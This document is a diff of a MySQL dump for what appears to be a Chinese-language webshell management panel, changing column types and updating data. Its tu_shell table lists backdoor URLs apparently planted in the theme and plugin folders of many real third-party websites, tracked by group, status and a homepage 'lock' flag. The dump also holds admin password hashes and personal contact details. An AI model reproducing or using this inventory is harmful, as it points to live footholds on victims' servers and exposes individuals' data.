@@ -18,24 +18,25 @@ DROP TABLE IF EXISTS `tu_admin`;
 
 CREATE TABLE `tu_admin` (
   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
-  `username` varchar(60) NOT NULL DEFAULT '' COMMENT '用户名',
-  `password` varchar(64) NOT NULL DEFAULT '' COMMENT '登录密码；mb_password加密',
+  `username` varchar(255) DEFAULT NULL,
+  `password` varchar(255) DEFAULT NULL,
   `avatar` varchar(255) NOT NULL DEFAULT '' COMMENT '用户头像，相对于upload/avatar目录',
-  `email` varchar(100) NOT NULL DEFAULT '' COMMENT '登录邮箱',
+  `email` longtext,
   `email_code` varchar(60) DEFAULT NULL COMMENT '激活码',
   `phone` bigint(20) unsigned DEFAULT NULL COMMENT '手机号',
-  `status` tinyint(1) NOT NULL DEFAULT '1' COMMENT '用户状态 0：禁用； 1：正常',
+  `status` bigint(20) DEFAULT NULL,
   `register_time` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '注册时间',
   `last_login_ip` varchar(16) NOT NULL DEFAULT '' COMMENT '最后登录ip',
   `last_login_time` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '最后登录时间',
   `remark` varchar(100) DEFAULT NULL,
+  `registertime` longtext,
   PRIMARY KEY (`id`),
-  KEY `user_login_key` (`username`) USING BTREE
+  KEY `user_login_key` (`username`)
 ) ENGINE=MyISAM AUTO_INCREMENT=24 DEFAULT CHARSET=utf8;
 
 /*Data for the table `tu_admin` */
 
-insert  into `tu_admin`(`id`,`username`,`password`,`avatar`,`email`,`email_code`,`phone`,`status`,`register_time`,`last_login_ip`,`last_login_time`,`remark`) values (1,'admin','a9bf03cd0485dfde54b0225bd4144e41','/uploads/file/20241114/6cac6c24901ddaf5e7e80090f3d120f9.png','admin++@qq.com',NULL,13912345600,1,1716813295,'',0,''),(20,'test','ee989b7e5f1087a5be8ab95c15d96cdb','','cqhaibo@gmail.com',NULL,NULL,0,0,'',0,NULL);
+insert  into `tu_admin`(`id`,`username`,`password`,`avatar`,`email`,`email_code`,`phone`,`status`,`register_time`,`last_login_ip`,`last_login_time`,`remark`,`registertime`) values (1,'admin','a9bf03cd0485dfde54b0225bd4144e41','/uploads/file/20241114/6cac6c24901ddaf5e7e80090f3d120f9.png','admin++@qq.com',NULL,13912345600,1,1716813295,'',0,'',NULL),(20,'test','ee989b7e5f1087a5be8ab95c15d96cdb','','cqhaibo@gmail.com',NULL,NULL,0,0,'',0,NULL,NULL);
 
 /*Table structure for table `tu_auth_group` */
 
@@ -43,9 +44,9 @@ DROP TABLE IF EXISTS `tu_auth_group`;
 
 CREATE TABLE `tu_auth_group` (
   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
-  `title` char(100) NOT NULL DEFAULT '',
-  `status` tinyint(1) NOT NULL DEFAULT '1',
-  `rules` text COMMENT '规则id',
+  `title` longtext,
+  `status` bigint(20) DEFAULT NULL,
+  `rules` longtext,
   PRIMARY KEY (`id`)
 ) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='用户组表';
 
@@ -75,15 +76,15 @@ DROP TABLE IF EXISTS `tu_auth_rule`;
 
 CREATE TABLE `tu_auth_rule` (
   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
-  `pid` int(10) unsigned DEFAULT '0' COMMENT '父级id',
-  `name` char(80) DEFAULT '' COMMENT '规则唯一标识',
-  `title` char(20) DEFAULT '' COMMENT '规则中文名称',
-  `status` tinyint(1) DEFAULT '1' COMMENT '状态：为1正常，为0禁用',
+  `pid` bigint(20) DEFAULT NULL,
+  `name` longtext,
+  `title` longtext,
+  `status` bigint(20) DEFAULT NULL,
   `is_menu` tinyint(3) unsigned DEFAULT '0' COMMENT '菜单显示',
-  `condition` char(100) DEFAULT '' COMMENT '规则表达式，为空表示存在就验证，不为空表示按照条件验证',
-  `type` tinyint(1) DEFAULT '1',
+  `condition` longtext,
+  `type` bigint(20) DEFAULT NULL,
   `sort` int(11) DEFAULT '999',
-  `icon` varchar(40) DEFAULT '',
+  `icon` longtext,
   `z_index` int(11) NOT NULL DEFAULT '0' COMMENT '菜单位置 0 左侧  1 顶部(只有一级菜单 才能开启顶部展示)',
   PRIMARY KEY (`id`)
 ) ENGINE=MyISAM AUTO_INCREMENT=158 DEFAULT CHARSET=utf8 COMMENT='规则表';
@@ -407,26 +408,26 @@ DROP TABLE IF EXISTS `tu_shell`;
 
 CREATE TABLE `tu_shell` (
   `id` int(10) NOT NULL AUTO_INCREMENT,
-  `host` varchar(200) DEFAULT NULL COMMENT '域名',
-  `scheme` varchar(10) DEFAULT NULL COMMENT '协议',
-  `group_id` int(10) DEFAULT NULL COMMENT '分组',
-  `status` int(11) DEFAULT NULL COMMENT '状态 0:待处理 1:正常 2:失效 3:人工处理 4:处理失败',
-  `num` int(1) DEFAULT '0' COMMENT '0:没备 1:备小码 2:备大码',
-  `maxurl` varchar(500) DEFAULT NULL COMMENT '大码',
-  `minurl` varchar(500) DEFAULT NULL COMMENT '小码',
-  `dir` int(1) DEFAULT '1' COMMENT '目录 0:当目录 1:根目录',
-  `lock` int(1) DEFAULT '0' COMMENT '锁定 0:没锁 1:首页 2:全锁',
-  `remark` varchar(200) DEFAULT NULL COMMENT '备注',
-  `addtime` int(10) DEFAULT NULL COMMENT '添加时间',
-  `uptime` int(10) DEFAULT NULL COMMENT '更新时间',
-  `sitenum` int(10) DEFAULT '0' COMMENT '收录',
+  `host` longtext,
+  `scheme` longtext,
+  `group_id` bigint(20) DEFAULT NULL,
+  `status` bigint(20) DEFAULT NULL,
+  `num` bigint(20) DEFAULT NULL,
+  `maxurl` longtext,
+  `minurl` longtext,
+  `dir` bigint(20) DEFAULT NULL,
+  `lock` bigint(20) DEFAULT NULL,
+  `remark` longtext,
+  `addtime` bigint(20) DEFAULT NULL,
+  `uptime` bigint(20) DEFAULT NULL,
+  `sitenum` bigint(20) DEFAULT NULL,
   PRIMARY KEY (`id`),
   KEY `id` (`id`)
-) ENGINE=InnoDB AUTO_INCREMENT=22 DEFAULT CHARSET=utf8mb4 COMMENT='shell管理';
+) ENGINE=InnoDB AUTO_INCREMENT=36 DEFAULT CHARSET=utf8mb4 COMMENT='shell管理';
 
 /*Data for the table `tu_shell` */
 
-insert  into `tu_shell`(`id`,`host`,`scheme`,`group_id`,`status`,`num`,`maxurl`,`minurl`,`dir`,`lock`,`remark`,`addtime`,`uptime`,`sitenum`) values (9,'127.0.0.223','http',1,1,1,'http://127.0.0.223/wp-content/admin.php','admin.php',0,1,'',1741077073,1781248470,0),(15,'ergoneo.be','http',3,2,1,'http://ergoneo.be/core/cghmj.php?pops','admin.php',0,0,'',1776503217,1781595159,0),(21,'www.baidu.com','https',1,0,0,'https://www.baidu.com/ss.php','admin.php',0,0,'',1781595308,1781595308,0);
+insert  into `tu_shell`(`id`,`host`,`scheme`,`group_id`,`status`,`num`,`maxurl`,`minurl`,`dir`,`lock`,`remark`,`addtime`,`uptime`,`sitenum`) values (9,'127.0.0.223','http',1,1,1,'http://127.0.0.223/wp-content/admin.php','admin.php',0,1,'',1741077073,1781248470,10),(15,'ergoneo.be','http',3,2,1,'http://ergoneo.be/core/cghmj.php?pops','admin.php',0,2,'',1776503217,1781601194,30),(23,'sina.com.cn','http',6,0,0,'http://sina.com.cn/sss.php','admin.php',0,0,'',1781663290,1781663290,0),(24,'jubatu.org','https',6,2,0,'https://jubatu.org/resources/vendor/gmaps/test/lib/github.php?pops','admin.php',0,0,'',1781663334,1781663334,0),(25,'katerinariga.gr','https',6,0,0,'https://katerinariga.gr/admin/language/en-gb/extension/extension/Y7Q5LqcFW2x.php?pops','admin.php',0,0,'',1781663347,1781663347,0),(26,'www.davidegiovagnoli.com','https',6,0,0,'https://www.davidegiovagnoli.com/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_Pz2inx.php?pops','admin.php',0,0,'',1781663364,1781663364,0),(27,'kaccsa.com','https',6,0,0,'https://kaccsa.com/plugins/content/jw_joomla/jw_joomla/includes/elements/Firewall_6JHKQx.php?pops','admin.php',0,0,'',1781663377,1781663377,0),(28,'modz.ch','http',6,0,0,'http://modz.ch/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_gMRuxx.php?pops','admin.php',0,0,'',1781663389,1781663389,0),(29,'www.k-financialservices.com','http',6,0,0,'http://www.k-financialservices.com/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_weAqDx.php?pops','admin.php',0,0,'',1781663402,1781663402,0),(30,'www.menwin.net','http',6,0,0,'http://www.menwin.net/wp-content/plugins/wptelegram-widget/includes/restApi/README.php?pop','admin.php',0,0,'',1781663525,1781663525,0),(31,'saqifamarketing.com','http',6,0,0,'http://saqifamarketing.com/_protected/tests/codeception/common/templates/fixtures/README.php?pops','admin.php',0,0,'',1781663539,1781663539,0),(32,'www.ryv-travel.com.ar','http',6,1,0,'http://www.ryv-travel.com.ar/includes/recaptcha/tests/ReCaptcha/RequestMethod/huTest.php.pif','admin.php',0,0,'',1781663553,1781663553,0),(33,'jestesskarbem.org','https',6,0,0,'https://jestesskarbem.org/plugins/content/jw_joomla/jw_joomla/includes/elements/fhujk.php?pops','admin.php',0,0,'',1781663562,1781663562,0),(34,'pilshellas.gr','https',6,0,0,'https://pilshellas.gr/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_rtZfSx.php?pops','admin.php',0,0,'',1781663575,1781663575,0),(35,'zaukovo.ru','http',6,0,0,'http://zaukovo.ru/plugins/content/jw_joomla/jw_joomla/includes/elements/sdga.php?pops','admin.php',0,0,'',1781663586,1781663586,0);
 
 /*Table structure for table `tu_shell_group` */
 
@@ -434,15 +435,16 @@ DROP TABLE IF EXISTS `tu_shell_group`;
 
 CREATE TABLE `tu_shell_group` (
   `id` int(10) NOT NULL AUTO_INCREMENT,
-  `name` varchar(200) DEFAULT NULL COMMENT '组名',
+  `name` longtext,
   `mmurl` varchar(200) DEFAULT NULL COMMENT 'mm',
-  `addtime` int(10) DEFAULT NULL COMMENT '时间',
+  `addtime` bigint(20) DEFAULT NULL,
+  `url` longtext,
   PRIMARY KEY (`id`)
 ) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COMMENT='分组管理';
 
 /*Data for the table `tu_shell_group` */
 
-insert  into `tu_shell_group`(`id`,`name`,`mmurl`,`addtime`) values (1,'B303','admin.php',NULL),(2,'B304','',NULL),(3,'D2-cf001','',NULL),(4,'D2-cf002','',NULL),(5,'D2-cf003','',1776482448),(6,'D2-cf004','',1776482448);
+insert  into `tu_shell_group`(`id`,`name`,`mmurl`,`addtime`,`url`) values (1,'B303','admin.php',NULL,NULL),(2,'B304','',NULL,NULL),(3,'D2-cf001','',NULL,NULL),(4,'D2-cf002','',NULL,NULL),(5,'D2-cf003','',1776482448,NULL),(6,'D2-cf004','',1776482448,NULL);
 
 /*Table structure for table `tu_shell_max` */
 
